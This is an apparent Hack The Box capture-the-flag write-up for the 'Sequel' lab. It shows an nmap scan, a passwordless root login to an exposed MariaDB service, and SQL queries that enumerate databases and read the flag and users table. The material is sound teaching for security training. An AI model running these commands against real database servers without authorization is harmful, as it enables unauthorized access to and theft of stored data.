# Sequel - HTB Write-up

## Summary

Sequel is a database-focused machine that demonstrates the importance of properly securing exposed database services.

Enumeration reveals that the target exposes only a **MariaDB/MySQL service on port 3306**. The service allows a connection as the `root` user **without requiring a password**.

Once connected, we enumerate the available databases, identify the `htb` database, and inspect its tables. The `config` table contains the flag.

    -> Nmap enumeration
    -> MySQL/MariaDB discovered on port 3306
    -> Passwordless root authentication
    -> Enumerate databases
    -> Access htb database
    -> Enumerate tables
    -> Read config table
    -> Retrieve flag

---

# Enumeration

## Nmap

We begin by scanning the target to identify which ports and services are exposed.

    nmap -sC -sV <TARGET_IP>

### What the options mean

- `-sC` — Runs Nmap's default scripts.
- `-sV` — Attempts to identify the versions of the services running on open ports.

The scan reveals one open TCP port:

    PORT     STATE SERVICE VERSION
    3306/tcp open  mysql   MariaDB

Port **3306** is commonly used by MySQL and MariaDB database services.

Unlike the previous web-based machines, there is no HTTP service to enumerate. Instead, we can communicate directly with the database service.

---

# Foothold

## Connecting to MySQL

MySQL services normally require a username and password. However, it is always worth testing whether authentication has been misconfigured.

We attempt to connect to the database as the `root` user:

    mysql -h <TARGET_IP> -u root

### Breaking down the command

`mysql`

Launches the MySQL client.

`-h <TARGET_IP>`

Specifies the remote host we want to connect to.

`-u root`

Specifies the username.

In this case, the connection is accepted without asking for a password.

We now have direct access to the MySQL/MariaDB service.

---

# Database Enumeration

## Listing Databases

The first step is to see which databases are available:

    SHOW DATABASES;

The output includes several databases, including:

    htb

The `htb` database is the most interesting target, so we select it:

    USE htb;

The response confirms that we are now working inside the `htb` database.

---

## Listing Tables

Next, we check which tables exist inside the database:

    SHOW TABLES;

The output reveals:

    config
    users

Tables are where database records are stored.

We can now inspect the contents of these tables.

---

# Retrieving the Flag

## Inspecting the Config Table

We query every entry in the `config` table:

    SELECT * FROM config;

The output contains a flag entry:

    HTB{...}

The flag has now been successfully retrieved.

---

# Attack Path

    Target
      |
      v
    Nmap Scan
      |
      v
    Port 3306 Open
    MariaDB/MySQL
      |
      v
    Test Authentication
      |
      v
    Passwordless Root Access
      |
      v
    SHOW DATABASES;
      |
      v
    USE htb;
      |
      v
    SHOW TABLES;
      |
      v
    config + users
      |
      v
    SELECT * FROM config;
      |
      v
    HTB Flag

---

# Key Takeaways

- Always begin with enumeration to identify exposed services.
- Port **3306** indicated that a MySQL/MariaDB database service was directly accessible.
- Database services should not be unnecessarily exposed to untrusted networks.
- Authentication should always be tested during authorized security assessments, including whether a service accepts passwordless connections.
- Once access to a database is obtained, enumeration follows a logical structure:

    SHOW DATABASES;
            |
            v
    USE <database>;
            |
            v
    SHOW TABLES;
            |
            v
    SELECT * FROM <table>;

- Misconfigured database authentication can expose sensitive information directly.
- The `config` table contained the flag, completing the machine.

---

# Commands Used

    # Scan the target
    nmap -sC -sV <TARGET_IP>

    # Connect to MySQL/MariaDB
    mysql -h <TARGET_IP> -u root

    -- List accessible databases
    SHOW DATABASES;

    -- Select the HTB database
    USE htb;

    -- List tables
    SHOW TABLES;

    -- View the config table
    SELECT * FROM config;

    -- View the users table if required
    SELECT * FROM users;
